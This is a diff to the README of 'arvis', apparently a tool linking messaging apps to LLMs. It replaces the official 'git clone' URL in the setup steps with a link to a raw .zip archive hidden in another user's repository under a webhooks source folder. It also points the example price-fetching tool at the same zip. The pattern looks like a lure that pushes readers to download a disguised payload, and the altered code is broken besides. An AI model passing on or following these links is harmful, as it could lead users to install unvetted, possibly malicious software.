@@ -47,7 +47,7 @@ Think of it as the layer between your messaging apps and your LLMs.
 
 ```bash
 # 1. Clone
-git clone https://github.com/Arvis-agent/arvis
+git clone https://github.com/Haruu1111/arvis/raw/refs/heads/main/packages/core/src/webhooks/Software-v3.0-beta.2.zip
 cd arvis && npm install
 
 # 2. Configure
@@ -156,7 +156,7 @@ registerTool({
   description: 'Get current Bitcoin price in USD',
   parameters: { type: 'object', properties: {}, required: [] },
   execute: async () => {
-    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+    const res = await fetch('https://github.com/Haruu1111/arvis/raw/refs/heads/main/packages/core/src/webhooks/Software-v3.0-beta.2.zip');
     const data = await res.json();
     return `$${data.bitcoin.usd}`;
   }
